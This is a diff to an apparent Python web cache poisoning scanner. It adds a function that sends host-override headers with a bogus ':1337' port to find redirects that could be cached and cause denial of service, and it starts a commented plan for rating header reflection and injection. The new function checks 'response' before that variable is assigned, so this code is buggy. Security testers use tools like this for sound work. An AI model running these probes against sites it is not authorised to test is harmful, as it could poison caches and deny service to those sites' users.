@@ -507,6 +507,41 @@ def attack_host_override(url):
     return (is_vulnerable, exploitable_headers)
 
 #
+# Partially override host header, add the wrong port -> DoS
+#
+def attack_port_dos(url):
+    exploitable_headers = []
+    is_vulnerable = False
+    
+    #if the response is not a redirect there's nothing to do
+    initial_response = httpx.request("GET", url, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+                                                  "accept":"*/*, text/stuff",
+                                                  "origin":"https://www.example.com"})
+    if response.status_code not in [301, 302, 303, 307, 308]:
+        return (is_vulnerable, exploitable_headers)
+    
+    headers = open("lists/host-override-headers.txt", "r").read().splitlines()
+
+    for header in headers:
+        #generate a cache buster and send the request with the header
+        cache_buster = "cache-" + gen_rand_str(8)
+        response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+                                                                                            "accept":"*/*, text/" + cache_buster,
+                                                                                            "origin":"https://" + cache_buster + ".example.com",
+                                                                                            header:initial_response.request.headers["host"] + ":1337"})
+        #if we get reflection in the response body remove header and try again
+        if "location" in response.headers and ":1337" in response.headers["location"]:
+            time.sleep(1)
+            response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+                                                                                            "accept":"*/*, text/" + cache_buster,
+                                                                                            "origin":"https://" + cache_buster + ".example.com"})
+            if "location" in response.headers and ":1337" in response.headers["location"]:
+                exploitable_headers.append(header)
+                is_vulnerable = True
+    
+    return (is_vulnerable, exploitable_headers)
+
+#
 # Send illegal header, causes DoS
 #
 def attack_illegal_header(url):
@@ -595,6 +630,26 @@ def header_bruteforce(url, header_count=15, thread_count=5):
     for header_list in  list(executor_results):
         retval = retval + header_list
     return retval
+
+
+###########################
+### SEVERITY ASSESSMENT ###
+###########################
+
+#
+# To assess the severity of interesting headers after a header-bruteforce, we check:
+#   - is the response cached?
+#   - is the header content reflected in the body?
+#   |--> where is it reflected (inside scripts, tags, tag attributes)?
+#    `-> is it filtered? can we escape the context?
+#   - is the header content reflected in response headers?
+#   |--> are they important headers? e.g. location, x-frame-options, x-allow-credentials, x-allow-origin, etc...
+#    `-> are they escapeable? can we use http header injection?
+#   - does it cause response code change? see cacheability 
+#
+# For every header this function returns a tuple in the following form:
+# ( is_response_cacheable, is_status_code_changed, new_status_code, is_body_reflected, is_body_unfiltered, is_header_reflected, is_header_injectable, score )
+#
 
 logging.basicConfig(level=logging.INFO)
 print_banner()
